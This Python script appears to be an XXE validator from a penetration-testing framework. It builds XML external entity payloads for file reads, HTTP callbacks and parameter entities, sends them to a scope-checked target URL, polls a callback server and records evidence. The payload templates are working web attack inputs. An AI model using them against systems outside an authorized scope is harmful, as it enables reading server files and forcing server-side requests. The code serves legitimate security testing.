#!/usr/bin/env python3
"""XXE validator with controlled callback.

Testa XML entity injection para SSRF/file read via parser XML.
Suporta:
  - file:// (somente arquivos publicos/autorizados)
  - http:// para callback
  - parameter entities
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "engine"))

import redlensctl  # noqa: E402
from runtime_executor import exec_kali  # noqa: E402


def xxe_payload_file(file_path: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>
  <data>&xxe;</data>
</root>"""


def xxe_payload_http(callback_url: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<root>
  <data>&xxe;</data>
</root>"""


def xxe_parameter_entity(callback_url: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "{callback_url}">
  %remote;
]>
<root>
  <data>test</data>
</root>"""


def send_xml(url: str, body: str, method: str = "POST") -> tuple[int, dict, bytes]:
    req = urllib.request.Request(url, data=body.encode("utf-8"), method=method, headers={"Content-Type": "application/xml"})
    try:
        with urllib.request.urlopen(req, timeout=30) as response:
            return response.status, dict(response.headers), response.read(64 * 1024)
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers or {}), exc.read(64 * 1024) if hasattr(exc, "read") else b""
    except Exception as exc:
        raise redlensctl.RedLensError(f"Falha: {exc}") from exc


def _callback_server_command(action: str, token: str | None = None) -> list[str]:
    cmd = ["python3", "/workspace/redlens-callback-server.py", action]
    if token and action in {"hits", "wait"}:
        cmd.extend(["--token", token])
    return cmd


def check_callback_server_reachable(timeout: int = 10) -> bool:
    try:
        result = exec_kali(_callback_server_command("status"), timeout=timeout)
        if result.returncode != 0:
            return False
        data = json.loads(result.stdout)
        return bool(data.get("running"))
    except (Exception, subprocess.TimeoutExpired, FileNotFoundError, OSError, json.JSONDecodeError):
        return False


def check_callback_hit(token: str, timeout: int = 10) -> tuple[bool, dict | None]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = exec_kali(_callback_server_command("hits", token), timeout=10)
        if result.returncode == 0:
            try:
                data = json.loads(result.stdout)
                for hit in data.get("hits", []):
                    if hit.get("token") == token:
                        return True, hit
            except json.JSONDecodeError:
                pass
        time.sleep(1)
    return False, None


def main() -> int:
    parser = argparse.ArgumentParser(prog="xxe-validator")
    parser.add_argument("--run", required=True)
    parser.add_argument("--url", required=True)
    parser.add_argument("--token", help="Token de callback")
    parser.add_argument("--callback-host", default="host.docker.internal")
    parser.add_argument("--callback-port", type=int, default=8080)
    parser.add_argument("--file-target", default="/etc/hostname", help="Arquivo para tentar ler (default publico)")
    args = parser.parse_args()

    try:
        directory = redlensctl.run_dir(args.run)
        redlensctl.scoped_url(directory, args.url)

        if not args.token:
            args.token = redlensctl.safe_id("token", args.url)[:12]
        callback_url = f"http://{args.callback_host}:{args.callback_port}/redlens-cb/{args.token}"
        callback_reachable = check_callback_server_reachable(timeout=5)

        baseline = """<?xml version="1.0" encoding="UTF-8"?><root><data>normal</data></root>"""
        b_status, _, b_body = send_xml(args.url, baseline)

        timestamp = redlensctl.iso().replace(":", "").replace("-", "")
        raw_dir = directory / "evidence" / "raw"
        raw_dir.mkdir(parents=True, exist_ok=True)
        raw_baseline_path = raw_dir / f"{timestamp}-xxe-baseline-{args.token}.xml"
        redlensctl.write_raw(raw_baseline_path, b_body)

        findings = []
        raw_files = {"baseline": str(raw_baseline_path.relative_to(directory))}
        confirmed_by_callback = False
        raw_hit = None

        payloads = [
            ("http_callback", xxe_payload_http(callback_url)),
            ("file_read", xxe_payload_file(args.file_target)),
            ("param_entity", xxe_parameter_entity(callback_url)),
        ]

        for name, payload in payloads:
            status, headers, body = send_xml(args.url, payload)
            body_str = body.decode("utf-8", errors="ignore")
            raw_path = raw_dir / f"{timestamp}-xxe-{name}-{args.token}.xml"
            redlensctl.write_raw(raw_path, body)
            raw_files[name] = str(raw_path.relative_to(directory))

            entry = {
                "name": name,
                "status": status,
                "baseline_status": b_status,
                "body_changed": body != b_body,
                "body_excerpt": body_str[:256],
                "raw_response": str(raw_path.relative_to(directory)),
            }

            # Confirmacao so com interacao externa observavel ou exfiltracao de dados.
            if callback_reachable and name in {"http_callback", "param_entity"}:
                hit, hit_data = check_callback_hit(args.token, timeout=5)
                if hit:
                    confirmed_by_callback = True
                    raw_hit = hit_data
                    entry["callback_hit"] = True

            if status != b_status or body != b_body or entry.get("callback_hit"):
                findings.append(entry)

        verdict = "tested-negative"
        confidence = "medium"
        if confirmed_by_callback:
            verdict = "confirmed"
            confidence = "high"
        elif findings:
            verdict = "needs_review"
            confidence = "low"

        if raw_hit:
            raw_hit_path = raw_dir / f"{timestamp}-xxe-callback-hit-{args.token}.json"
            redlensctl.write_json(raw_hit_path, raw_hit)
            raw_files["callback_hit"] = str(raw_hit_path.relative_to(directory))

        sanitized_dir = directory / "evidence" / "sanitized"
        sanitized_dir.mkdir(parents=True, exist_ok=True)
        summary_path = sanitized_dir / f"{timestamp}-xxe-{args.token}.json"
        summary = {
            "capability": "xxe",
            "verdict": verdict,
            "confidence": confidence,
            "url": args.url,
            "callback_reachable": callback_reachable,
            "callback_url": callback_url,
            "findings": findings,
            "raw_files": raw_files,
        }
        redlensctl.write_json(summary_path, summary)

        if verdict == "confirmed":
            finding_id = redlensctl.safe_id("xxe", args.url)[:24]
            redlensctl.write_json(directory / "findings" / f"{finding_id}.json", {
                "id": finding_id,
                "title": f"XXE em {args.url}",
                "severity": "high",
                "status": "confirmed",
                "asset": args.url,
                "evidence": [str(summary_path.relative_to(directory))],
                "reproduced": True,
                "negative_control": True,
                "created_at": redlensctl.iso(),
            })

        redlensctl.append_event(directory, "xxe.validated", {
            "verdict": verdict,
            "url": args.url,
            "findings_count": len(findings),
            "confirmed_by_callback": confirmed_by_callback,
        })
        redlensctl.append_event(directory, "validator.finished", {
            "capability": "xxe",
            "verdict": verdict,
            "url": args.url,
        })

        print(json.dumps({
            "ok": True,
            "verdict": verdict,
            "confidence": confidence,
            "findings": findings,
        }, ensure_ascii=False, indent=2))
        return 0
    except (
        redlensctl.RedLensError,
        KeyError,
        ValueError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"ok": False, "error": str(exc)}, ensure_ascii=False), file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
